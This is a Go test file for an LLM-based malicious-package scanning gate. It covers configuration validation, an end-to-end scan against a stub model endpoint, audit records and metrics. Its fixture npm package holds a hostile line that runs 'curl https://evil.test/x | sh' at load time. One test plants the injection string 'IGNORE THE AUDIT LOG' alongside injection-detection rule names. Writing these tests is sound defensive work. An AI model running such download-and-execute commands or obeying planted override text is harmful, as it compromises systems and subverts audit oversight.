package main

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/audit"
	"github.com/blechschmidt/pullthrough-security/internal/config"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/metrics"
	"github.com/blechschmidt/pullthrough-security/internal/scan/commit"
)

func llmTestLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

func llmDefaultConfig() *config.Config {
	cfg := config.Default()
	return &cfg
}

func TestBuildLLMPkgScanDisabled(t *testing.T) {
	svc, closer, err := buildLLMPkgScan(llmDefaultConfig(), nil, nil, llmTestLogger())
	if err != nil || svc != nil {
		t.Fatalf("disabled gate: svc=%v err=%v, want nil, nil", svc, err)
	}
	if err := closer(); err != nil {
		t.Errorf("no-op closer: %v", err)
	}
	// A nil service is what the gateway, the admin API and the metrics binder get.
	bindLLMPkgScanMetrics(metrics.NewCollector(), svc)
}

// The configuration package validates llmPackageScan without importing the
// gate. This is where the two are held to the same defaults and the same rules.
func TestLLMPkgScanConfigDefaultsMatchTheGate(t *testing.T) {
	lc := llmDefaultConfig().LLMPackageScan
	want := llmpkgscan.DefaultLimits()
	got := llmpkgscan.Limits{
		MaxArtifactBytes: lc.Limits.MaxArtifactBytes, MaxUnpackedBytes: lc.Limits.MaxUnpackedBytes,
		MaxFileBytes: lc.Limits.MaxFileBytes, MaxFiles: lc.Limits.MaxFiles, MaxDepth: lc.Limits.MaxDepth,
		MaxCompressionRatio: lc.Limits.MaxCompressionRatio, MaxPromptBytes: lc.Limits.MaxPromptBytes,
		MaxToolResultBytes: lc.Limits.MaxToolResultBytes, MaxToolBytes: lc.Limits.MaxToolBytes,
		MaxTurns: lc.Limits.MaxTurns, MaxToolCalls: lc.Limits.MaxToolCalls,
		MaxOutputTokens: lc.Limits.MaxOutputTokens, MaxTotalTokens: lc.Limits.MaxTotalTokens,
	}
	if got != want {
		t.Errorf("config default limits = %+v\n gate default limits = %+v", got, want)
	}
	if lc.MaliciousThreshold != llmpkgscan.DefaultMaliciousThreshold || lc.SuspiciousThreshold != llmpkgscan.DefaultSuspiciousThreshold {
		t.Errorf("config default thresholds = %v / %v", lc.MaliciousThreshold, lc.SuspiciousThreshold)
	}

	// A gate built from the documented defaults reports exactly those defaults,
	// and one built from an all-zero gate config (every default applied by the
	// gate itself) reports the same — so neither side has drifted.
	cfg := llmDefaultConfig()
	cfg.LLMPackageScan.Enabled = true
	cfg.LLMPackageScan.Provider = "claude"
	cfg.LLMPackageScan.APIKey = "sk-test"
	fromConfig, closer, err := buildLLMPkgScan(cfg, nil, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("buildLLMPkgScan: %v", err)
	}
	defer closer()
	bare, err := llmpkgscan.NewService(llmpkgscan.Config{Enabled: true, Provider: &pkgscantest.Provider{}, Model: "m", Logger: llmTestLogger()})
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	defer bare.Close()
	a, b := fromConfig.Status(), bare.Status()
	if a.Action != b.Action || a.FailMode != b.FailMode || a.MaliciousThreshold != b.MaliciousThreshold ||
		a.SuspiciousThreshold != b.SuspiciousThreshold || a.TimeoutSeconds != b.TimeoutSeconds || a.Limits != b.Limits ||
		strings.Join(a.Ecosystems, ",") != strings.Join(b.Ecosystems, ",") {
		t.Errorf("gate from config defaults:\n %+v\ngate from its own defaults:\n %+v", a, b)
	}
	if a.Action != llmpkgscan.ActionBlock || a.FailMode != llmpkgscan.FailOpen {
		t.Errorf("defaults = %s / %s, want block / open", a.Action, a.FailMode)
	}
	if a.Provider != "claude" || a.Model != string(commit.DefaultDeepModel) || !a.ToolUse {
		t.Errorf("provider/model = %s / %s (tools %v)", a.Provider, a.Model, a.ToolUse)
	}
	if a.Thinking != commit.SupportsAdaptiveThinking(a.Model) {
		t.Errorf("thinking = %v for %s", a.Thinking, a.Model)
	}

	if got, want := strings.Join(config.LLMPackageScanDefaultEcosystems(), ","), strings.Join(llmpkgscan.DefaultEcosystems, ","); got != want {
		t.Errorf("config's default ecosystem set = %s, the gate's = %s", got, want)
	}

	// excludeUpstreams reaches the gate.
	ex := llmDefaultConfig()
	ex.Upstreams = map[string]config.UpstreamConfig{"corp-npm": {Type: "npm", URL: "https://npm.corp.example"}}
	ex.LLMPackageScan.Enabled = true
	ex.LLMPackageScan.Provider = "claude"
	ex.LLMPackageScan.APIKey = "sk-test"
	ex.LLMPackageScan.ExcludeUpstreams = []string{"corp-npm"}
	if err := ex.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	exSvc, exCloser, err := buildLLMPkgScan(ex, nil, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("buildLLMPkgScan: %v", err)
	}
	if exSvc.AppliesTo("npm", "corp-npm") || !exSvc.AppliesTo("npm", "npmjs") {
		t.Error("llmPackageScan.excludeUpstreams did not reach the gate")
	}
	_ = exCloser()

	// What the configuration layer accepts, the gate accepts.
	for _, mutate := range []func(*config.LLMPackageScanConfig){
		func(l *config.LLMPackageScanConfig) {
			l.Action = "quarantine"
			l.FailMode = "closed"
			l.Mode = "bundle"
		},
		func(l *config.LLMPackageScanConfig) { l.Action = "annotate"; l.Mode = "tools"; l.MaxRetries = -1 },
		func(l *config.LLMPackageScanConfig) { l.Limits.MaxTurns = 64; l.Limits.MaxToolCalls = 512 },
		func(l *config.LLMPackageScanConfig) {
			l.Limits.MaxPromptBytes = 4 << 10
			l.Limits.MaxToolResultBytes = 1 << 10
		},
		func(l *config.LLMPackageScanConfig) { l.Include = []string{"npm", "pypi"}; l.Exclude = []string{"npm"} },
		func(l *config.LLMPackageScanConfig) {
			l.Budget.Enabled = true
			l.Budget.GlobalCeilingUSD = 50
			l.Budget.TenantCeilingsUSD = map[string]float64{"team-a": 5}
		},
	} {
		c := llmDefaultConfig()
		c.LLMPackageScan.Enabled = true
		c.LLMPackageScan.Provider = "openai"
		c.LLMPackageScan.APIKey = "sk-test"
		mutate(&c.LLMPackageScan)
		if err := c.Validate(); err != nil {
			t.Errorf("config rejected a valid llmPackageScan: %v", err)
			continue
		}
		svc, closer, err := buildLLMPkgScan(c, nil, nil, llmTestLogger())
		if err != nil {
			t.Errorf("the gate rejected a configuration the config layer accepted: %v", err)
			continue
		}
		_ = svc
		_ = closer()
	}

	// ...and what the gate would reject, the configuration layer rejects first.
	for name, mutate := range map[string]func(*config.LLMPackageScanConfig){
		"action":            func(l *config.LLMPackageScanConfig) { l.Action = "delete" },
		"failMode":          func(l *config.LLMPackageScanConfig) { l.FailMode = "ajar" },
		"mode":              func(l *config.LLMPackageScanConfig) { l.Mode = "agent" },
		"threshold":         func(l *config.LLMPackageScanConfig) { l.MaliciousThreshold = 1.5 },
		"maxTurns":          func(l *config.LLMPackageScanConfig) { l.Limits.MaxTurns = 65 },
		"maxToolCalls":      func(l *config.LLMPackageScanConfig) { l.Limits.MaxToolCalls = 513 },
		"maxPromptBytes":    func(l *config.LLMPackageScanConfig) { l.Limits.MaxPromptBytes = 100 },
		"ratio":             func(l *config.LLMPackageScanConfig) { l.Limits.MaxCompressionRatio = 0.5 },
		"negative size":     func(l *config.LLMPackageScanConfig) { l.Limits.MaxArtifactBytes = -1 },
		"tokens":            func(l *config.LLMPackageScanConfig) { l.Limits.MaxOutputTokens = 9000; l.Limits.MaxTotalTokens = 8000 },
		"negative ceiling":  func(l *config.LLMPackageScanConfig) { l.Budget.TenantCeilingUSD = -1 },
		"unknown ecosystem": func(l *config.LLMPackageScanConfig) { l.Include = []string{"floppy"} },
		"provider":          func(l *config.LLMPackageScanConfig) { l.Provider = "skynet" },
	} {
		c := llmDefaultConfig()
		c.LLMPackageScan.Enabled = true
		c.LLMPackageScan.Provider = "claude"
		c.LLMPackageScan.APIKey = "sk-test"
		mutate(&c.LLMPackageScan)
		if err := c.Validate(); err == nil {
			t.Errorf("%s: the configuration layer accepted an invalid llmPackageScan", name)
		}
	}
}

// With no provider of its own the gate uses the commit scanner's — provider,
// key, endpoint and deep model — so enabling it is one line for a deployment
// that already scans commits.
func TestBuildLLMPkgScanInheritsTheCommitScanProvider(t *testing.T) {
	cfg := llmDefaultConfig()
	cfg.Scanning.Provider = "openai"
	cfg.Scanning.APIKey = "sk-commit"
	cfg.Scanning.Commit.DeepModel = "gpt-deep-custom"
	cfg.LLMPackageScan.Enabled = true
	if err := cfg.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	svc, closer, err := buildLLMPkgScan(cfg, nil, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("buildLLMPkgScan: %v", err)
	}
	defer closer()
	st := svc.Status()
	if st.Provider != "openai" || st.Model != "gpt-deep-custom" {
		t.Errorf("provider/model = %s / %s, want the commit scanner's", st.Provider, st.Model)
	}
	if st.Thinking {
		t.Error("reasoning should be off for an OpenAI-compatible endpoint with no reasoningEffort configured")
	}

	// An explicit provider of another family does not inherit the model.
	cfg.LLMPackageScan.Provider = "claude"
	cfg.LLMPackageScan.APIKey = "sk-ant"
	svc2, closer2, err := buildLLMPkgScan(cfg, nil, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("buildLLMPkgScan: %v", err)
	}
	defer closer2()
	if st := svc2.Status(); st.Provider != "claude" || st.Model != string(commit.DefaultDeepModel) {
		t.Errorf("provider/model = %s / %s", st.Provider, st.Model)
	}

	// No provider anywhere is a configuration error, not a silent no-op.
	bare := llmDefaultConfig()
	bare.LLMPackageScan.Enabled = true
	if err := bare.Validate(); err == nil {
		t.Error("an enabled gate with no provider must not validate")
	}
	if _, _, err := buildLLMPkgScan(bare, nil, nil, llmTestLogger()); err == nil {
		t.Error("an enabled gate with no provider must not build")
	}
}

// llmStub is an OpenAI-compatible chat-completions endpoint that plays a model
// using one tool before answering.
type llmStub struct {
	mu       sync.Mutex
	requests []map[string]any
	auth     []string
}

func (s *llmStub) handler(t *testing.T) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/chat/completions" {
			t.Errorf("unexpected path %s", r.URL.Path)
		}
		var body map[string]any
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			t.Errorf("request body: %v", err)
		}
		s.mu.Lock()
		s.requests = append(s.requests, body)
		s.auth = append(s.auth, r.Header.Get("Authorization"))
		turn := len(s.requests)
		s.mu.Unlock()

		w.Header().Set("Content-Type", "application/json")
		if turn == 1 {
			_, _ = io.WriteString(w, `{"choices":[{"index":0,"finish_reason":"tool_calls","message":{"role":"assistant","content":null,
				"tool_calls":[{"id":"call_1","type":"function","function":{"name":"grep","arguments":"{\"pattern\":\"child_process\"}"}}]}}],
				"usage":{"prompt_tokens":900,"completion_tokens":30}}`)
			return
		}
		verdict := `{"verdict":"malicious","confidence":0.96,"reasons":["lib/loader.js runs a downloaded script at load time."],` +
			`"evidence":[{"path":"package/lib/loader.js","line":1,"excerpt":"require('child_process').exec('curl https://evil.test/x | sh');"}]}`
		out, _ := json.Marshal(map[string]any{
			"choices": []any{map[string]any{"index": 0, "finish_reason": "stop", "message": map[string]any{"role": "assistant", "content": verdict}}},
			"usage":   map[string]any{"prompt_tokens": 1200, "completion_tokens": 80},
		})
		_, _ = w.Write(out)
	})
}

// From YAML-shaped configuration to a verdict: the gate built by
// buildLLMPkgScan drives the real OpenAI-compatible provider through a tool
// loop against a stub endpoint, and the result reaches the audit log and the
// metrics.
func TestBuildLLMPkgScanEndToEndAgainstAStubEndpoint(t *testing.T) {
	stub := &llmStub{}
	srv := httptest.NewServer(stub.handler(t))
	defer srv.Close()

	sink := audit.NewMemorySink()
	auditLog, err := audit.NewLogger(context.Background(), audit.Options{Key: []byte("test-key"), Sink: sink})
	if err != nil {
		t.Fatalf("audit.NewLogger: %v", err)
	}

	cfg := llmDefaultConfig()
	lc := &cfg.LLMPackageScan
	lc.Enabled = true
	lc.Provider = "openai"
	lc.Model = "stub-model"
	lc.APIKey = "sk-package-scan-secret"
	lc.BaseURL = srv.URL + "/v1"
	lc.StoreDir = t.TempDir()
	lc.Limits.MaxPromptBytes = 8 << 10 // small enough that the package overflows the first prompt
	lc.Budget.Enabled = true
	lc.Budget.GlobalCeilingUSD = 100
	if err := cfg.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	svc, closer, err := buildLLMPkgScan(cfg, auditLog, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("buildLLMPkgScan: %v", err)
	}
	collector := metrics.NewCollector()
	bindLLMPkgScanMetrics(collector, svc)

	files := map[string]string{
		"index.js":      "module.exports = require('./lib/loader');\n",
		"lib/loader.js": "require('child_process').exec('curl https://evil.test/x | sh');\n",
	}
	for i := 0; i < 30; i++ {
		files["lib/filler"+string(rune('a'+i%26))+strings.Repeat("x", i/26)+".js"] = strings.Repeat("exports.v = 1; // filler\n", 200)
	}
	tarball := pkgscantest.NpmTarball("big-pkg", "2.0.0", nil, files)
	req := llmpkgscan.Request{
		Artifact: llmpkgscan.Artifact{Ecosystem: "npm", Name: "big-pkg", Version: "2.0.0", Filename: "big-pkg-2.0.0.tgz",
			Digest: pkgscantest.Digest(tarball), Size: int64(len(tarball))},
		Tenant: "team-a",
		Open:   pkgscantest.Opener(tarball, nil),
	}
	rep, err := svc.Assess(context.Background(), req)
	if err != nil || rep == nil {
		t.Fatalf("Assess: %+v, %v", rep, err)
	}
	if !rep.Scanned() || rep.Disposition != llmpkgscan.DispositionMalicious {
		t.Fatalf("report = %+v (unscanned %+v)", rep.Verdict, rep.Unscanned)
	}
	v := rep.Verdict
	if v.Mode != "tools" || v.Turns != 2 || v.ToolCalls != 1 || v.Provider != "openai" || v.Model != "stub-model" {
		t.Errorf("verdict provenance = %+v", v)
	}
	if len(v.Evidence) != 1 || !v.Evidence[0].Verified {
		t.Errorf("evidence = %+v, want one citation verified against the package", v.Evidence)
	}
	if d := svc.Gate(rep); d.Served() || !d.Evict || d.PolicyCode != llmpkgscan.PolicyCodeMalicious {
		t.Errorf("decision = %+v", d)
	}

	// What went over the wire.
	stub.mu.Lock()
	requests, auth := stub.requests, stub.auth
	stub.mu.Unlock()
	if len(requests) != 2 {
		t.Fatalf("provider requests = %d, want 2 (a tool turn and the answer)", len(requests))
	}
	for _, a := range auth {
		if a != "Bearer sk-package-scan-secret" {
			t.Errorf("Authorization = %q", a)
		}
	}
	tools, _ := requests[0]["tools"].([]any)
	var names []string
	for _, tool := range tools {
		fn, _ := tool.(map[string]any)["function"].(map[string]any)
		names = append(names, fn["name"].(string))
	}
	if strings.Join(names, ",") != "list_files,read_file,grep" {
		t.Errorf("tools offered to the model = %v, want exactly the three read-only tools", names)
	}
	if requests[0]["model"] != "stub-model" {
		t.Errorf("model = %v", requests[0]["model"])
	}
	// The tool result went back as package data, not as instructions.
	msgs, _ := requests[1]["messages"].([]any)
	last, _ := msgs[len(msgs)-1].(map[string]any)
	content, _ := last["content"].(string)
	if last["role"] != "tool" || !strings.Contains(content, "UNTRUSTED_PACKAGE_DATA") || !strings.Contains(content, "child_process") {
		t.Errorf("tool result message = %v", last)
	}

	// The key is configuration, not status.
	raw, _ := json.Marshal(svc.Status())
	if strings.Contains(string(raw), "sk-package-scan-secret") {
		t.Error("the API key appears in the gate status")
	}

	// The fresh verdict was audited — by category and provenance, without the
	// model's prose.
	var found bool
	for _, rec := range sink.Records() {
		ev := rec.Event
		if ev.Type != audit.EventScanVerdict {
			continue
		}
		found = true
		if ev.Reason != "llmpkgscan:malicious" || ev.Decision != audit.DecisionDeny || ev.Team != "team-a" ||
			ev.Resource != "npm/big-pkg@2.0.0" || ev.Detail["digest"] != pkgscantest.Digest(tarball) || ev.Detail["model"] != "stub-model" {
			t.Errorf("audit event = %+v", ev)
		}
		if blob, _ := json.Marshal(ev); strings.Contains(string(blob), "downloaded script") || strings.Contains(string(blob), "curl https://evil.test") {
			t.Errorf("the audit record carries model prose or package content: %s", blob)
		}
	}
	if !found {
		t.Error("no scan_verdict audit event was written")
	}

	// A second gate over the same store reuses the verdict: no provider call.
	if err := closer(); err != nil {
		t.Fatalf("close: %v", err)
	}
	svc2, closer2, err := buildLLMPkgScan(cfg, auditLog, nil, llmTestLogger())
	if err != nil {
		t.Fatalf("rebuild: %v", err)
	}
	defer closer2()
	rep2, err := svc2.Assess(context.Background(), req)
	if err != nil || rep2 == nil || !rep2.Cached || rep2.Disposition != llmpkgscan.DispositionMalicious {
		t.Fatalf("after restart: %+v, %v", rep2, err)
	}
	stub.mu.Lock()
	if len(stub.requests) != 2 {
		t.Errorf("provider requests after restart = %d, want still 2", len(stub.requests))
	}
	stub.mu.Unlock()

	// Metrics: every documented series is exposed, with the scan in them.
	rec := httptest.NewRecorder()
	collector.Handler().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/metrics", nil))
	exposition := rec.Body.String()
	for _, want := range []string{
		"pullthrough_llmpkgscan_assessed_total 1",
		"pullthrough_llmpkgscan_scans_total 1",
		"pullthrough_llmpkgscan_cache_misses_total 1",
		`pullthrough_llmpkgscan_verdicts_total{verdict="malicious"} 1`,
		`pullthrough_llmpkgscan_verdicts_total{verdict="benign"} 0`,
		"pullthrough_llmpkgscan_blocked_total 1",
		"pullthrough_llmpkgscan_provider_calls_total 2",
		`pullthrough_llmpkgscan_tokens_total{kind="input"} 2100`,
		`pullthrough_llmpkgscan_tokens_total{kind="output"} 110`,
		"pullthrough_llmpkgscan_turns_total 2",
		`pullthrough_llmpkgscan_tool_calls_total{tool="grep"} 1`,
		`pullthrough_llmpkgscan_scans_by_ecosystem_total{ecosystem="npm"} 1`,
		"pullthrough_llmpkgscan_in_flight 0",
		"pullthrough_llmpkgscan_queued 0",
		"pullthrough_llmpkgscan_breaker_open 0",
		"pullthrough_llmpkgscan_cost_usd_total",
		"pullthrough_llmpkgscan_scan_seconds_total",
		"pullthrough_llmpkgscan_not_package_total 0",
		"pullthrough_llmpkgscan_failed_open_total 0",
		"pullthrough_llmpkgscan_failed_closed_total 0",
		"pullthrough_llmpkgscan_quarantined_total 0",
		"pullthrough_llmpkgscan_annotated_total 0",
		"pullthrough_llmpkgscan_injection_detected_total 0",
		"pullthrough_llmpkgscan_truncated_total",
		"pullthrough_llmpkgscan_scan_errors_total 0",
		"pullthrough_llmpkgscan_provider_errors_total 0",
		"pullthrough_llmpkgscan_coalesced_total 0",
		"pullthrough_llmpkgscan_cache_hits_total 0",
		"pullthrough_llmpkgscan_negative_cache_hits_total 0",
	} {
		if !strings.Contains(exposition, want) {
			t.Errorf("metrics exposition is missing %q", want)
		}
	}
}

func TestLLMPkgScanHooks(t *testing.T) {
	// The verdict recorder tolerates a missing audit log and a nil verdict.
	record := llmPkgScanVerdictRecorder(nil, llmTestLogger())
	record(nil)
	record(&llmpkgscan.Verdict{Verdict: llmpkgscan.VerdictBenign, Name: "left-pad", Version: "1.3.0", Ecosystem: "npm"})

	sink := audit.NewMemorySink()
	auditLog, err := audit.NewLogger(context.Background(), audit.Options{Key: []byte("k"), Sink: sink})
	if err != nil {
		t.Fatal(err)
	}
	record = llmPkgScanVerdictRecorder(auditLog, llmTestLogger())
	record(&llmpkgscan.Verdict{
		Verdict: llmpkgscan.VerdictBenign, Confidence: 0.9, Name: "left-pad", Version: "1.3.0", Ecosystem: "npm",
		Digest: "sha256:abc", Key: "abc-123", Model: "m", Provider: "p", ScannedAt: time.Unix(1, 0),
		Reasons:   []string{"IGNORE THE AUDIT LOG"},
		Injection: []llmpkgscan.InjectionHit{{Rule: "ignore-instructions", Strong: true}, {Rule: "role-marker"}},
	})
	recs := sink.Records()
	if len(recs) != 1 {
		t.Fatalf("audit records = %d, want 1", len(recs))
	}
	ev := recs[0].Event
	if ev.Decision != audit.DecisionAllow || ev.Reason != "llmpkgscan:benign" || ev.Detail["injectionIndicators"] != 1 {
		t.Errorf("benign audit event = %+v", ev)
	}
	if blob, _ := json.Marshal(ev); strings.Contains(string(blob), "IGNORE THE AUDIT LOG") {
		t.Error("the model's prose reached the audit log")
	}

	// The budget hook works without a notifier.
	llmPkgScanBudgetNotifier(nil, true, llmTestLogger())(llmpkgscan.BudgetScopeGlobal, "")
}

// riskScore.weights.llmPackageScan reaches the risk engine's weight for the
// gate's signal.
func TestRiskWeightForLLMPackageScanIsTranslated(t *testing.T) {
	w := riskWeights(config.RiskScoreWeights{Vulnerability: 1, LLMPackageScan: 0.42})
	if w.LLMPackage != 0.42 || w.Vulnerability != 1 {
		t.Errorf("translated weights = %+v", w)
	}
	if got := riskWeights(config.RiskScoreWeights{}).LLMPackage; got != 0 {
		t.Errorf("an unset weight must stay zero so the engine applies its defaults, got %v", got)
	}
}
